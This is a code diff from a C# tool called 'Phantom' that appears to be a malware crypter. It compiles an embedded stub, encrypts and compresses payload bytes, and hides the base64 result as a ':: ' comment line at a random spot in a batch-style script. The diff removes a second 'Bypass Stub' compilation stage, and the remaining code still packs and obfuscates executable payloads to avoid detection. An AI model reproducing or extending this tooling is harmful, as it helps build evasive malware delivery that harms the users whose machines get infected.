@@ -290,56 +290,6 @@ namespace Phantom
             File.Delete(@"payload.exe");
             File.Delete(tempfile);
 
-            // Create another temporary file
-            tempfile = CreateTempFile(rng);
-
-            // Initialize another C# code provider
-            CSharpCodeProvider csc2 = new CSharpCodeProvider();
-
-            // Specify compiler parameters for second compilation (Bypass Stub)
-            CompilerParameters parameters2 = new CompilerParameters(new[] { @"mscorlib.dll", @"System.Core.dll", @"System.dll", @"System.Management.dll", @"Microsoft.VisualBasic.dll" }, tempfile)
-            {
-                GenerateExecutable = true,
-                CompilerOptions = @"-optimize -unsafe",
-                IncludeDebugInformation = false
-            };
-
-            // Compile embedded BStub.cs file
-            string BStub_Str = GetEmbeddedString(@"Phantom.Resources.BStub.cs");
-            if (fileType == FileType.NET64)
-            {
-                BStub_Str = "#define x64\n" + BStub_Str;
-            }
-            else if (fileType == FileType.x64)
-            {
-                BStub_Str = "#define x64\n" + BStub_Str;
-            }
-            CompilerResults results2 = csc2.CompileAssemblyFromSource(parameters2, BStub_Str);
-
-            // Check for compilation errors
-            if (results2.Errors.Count > 0)
-            {
-                // Delete temporary files
-                File.Delete(@"payload.txt");
-                File.Delete(tempfile);
-
-                // Show error message
-                MessageBox.Show(@"BStub build error!", @"Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
-
-                // Re-enable build button
-                buildButton.Enabled = true;
-
-                // Exit function
-                return;
-            }
-
-            // Encrypt and compress stub bytes
-            byte[] bstubbytes = Encrypt(mode, Compress(File.ReadAllBytes(tempfile)), _key, _iv);
-
-            // Delete temporary files
-            File.Delete(@"payload.exe");
-            File.Delete(tempfile);
-
             // Add message to listBox2
             listBox2.Items.Add(@"Encrypting stub...");
 
@@ -356,7 +306,7 @@ namespace Phantom
             List<string> content_lines = new List<string>(content.Split(new string[] { Environment.NewLine }, StringSplitOptions.None));
 
             // Insert encrypted stub bytes into content lines at random position
-            content_lines.Insert(rng.Next(0, content_lines.Count), $":: {Convert.ToBase64String(bstubbytes)}\\{Convert.ToBase64String(stub_enc)}");
+            content_lines.Insert(rng.Next(0, content_lines.Count), ":: " + Convert.ToBase64String(stub_enc));
             content = string.Join(Environment.NewLine, content_lines);
 
             // Initialize SaveFileDialog
